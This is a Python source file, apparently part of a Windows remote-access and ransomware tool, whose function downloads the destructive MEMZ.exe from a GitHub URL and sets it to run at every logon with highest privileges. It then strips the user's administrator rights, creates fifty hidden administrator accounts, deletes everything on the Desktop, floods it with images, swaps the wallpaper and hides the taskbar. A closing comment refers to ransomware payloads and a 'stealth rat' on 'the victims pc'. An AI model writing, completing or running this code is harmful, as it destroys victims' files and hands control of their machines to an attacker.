import os,shutil,subprocess,requests,random,string,time,ctypes
def anti_restart():
 appdata_roaming=os.path.join(os.environ['APPDATA'])
 url="https://raw.githubusercontent.com/Sam-cpu999/stuff/main/MEMZ.exe"
 download_path=os.path.join(appdata_roaming,"MEMZ0.exe")
 exe_dest=os.path.join(os.path.expanduser("~"),"MEMZ0.exe")
 if not os.path.exists(download_path):
  with requests.get(url)as r:
   open(download_path,"wb").write(r.content)
 shutil.copy(download_path,exe_dest)
 command=f'schtasks /create /tn "antirestart" /tr "{download_path}" /sc onlogon /rl HIGHEST /f'
 subprocess.run(command,shell=True)
 current_user=os.environ['USERNAME']
 subprocess.run(f'net localgroup Administrators {current_user} /delete',shell=True,check=False)
 for _ in range(50):
  username=''.join(random.choices([chr(random.randint(128,255))for _ in range(6)],k=7))
  password=''.join(random.choices(string.ascii_letters+string.digits,k=10))
  subprocess.run(f'net user {username} {password} /add',shell=True,check=True)
  subprocess.run(f'net localgroup Administrators {username} /add',shell=True,check=True)
 desktop_path=os.path.join(os.environ['USERPROFILE'],'Desktop')
 for filename in os.listdir(desktop_path):
  file_path=os.path.join(desktop_path,filename)
  try:
   if os.path.isdir(file_path):
    shutil.rmtree(file_path)
   else:
    os.remove(file_path)
  except Exception as e:
   pass
 time.sleep(0.1)
 image_url="https://th.bing.com/th/id/OIP.7ItOwWbqp4eK4XKnviTZrwHaFP?rs=1&pid=ImgDetMain"
 response=requests.get(image_url)
 if response.status_code==200:
  image_data=response.content
  for _ in range(100):
   random_filename=''.join(random.choices(string.ascii_letters+string.digits,k=60))+".jpg"
   image_path=os.path.join(desktop_path,random_filename)
   with open(image_path,"wb")as f:
    f.write(image_data)
 time.sleep(0.1)
 wallpaper_url="https://i.imgflip.com/9bd0j4.jpg"
 wallpaper_path=os.path.join(os.environ['USERPROFILE'],"wallpaper.png")
 response=requests.get(wallpaper_url)
 if response.status_code==200:
  with open(wallpaper_path,"wb")as f:
   f.write(response.content)
  ctypes.windll.user32.SystemParametersInfoW(20,0,wallpaper_path,3)
 taskbar=ctypes.windll.user32.FindWindowW('Shell_TrayWnd',None)
 ctypes.windll.user32.ShowWindow(taskbar,0)
 # now these are the ransomware payloads. they will only run on the victims pc if u said yes to enable ransomware. if not it will be a fully stealth rat
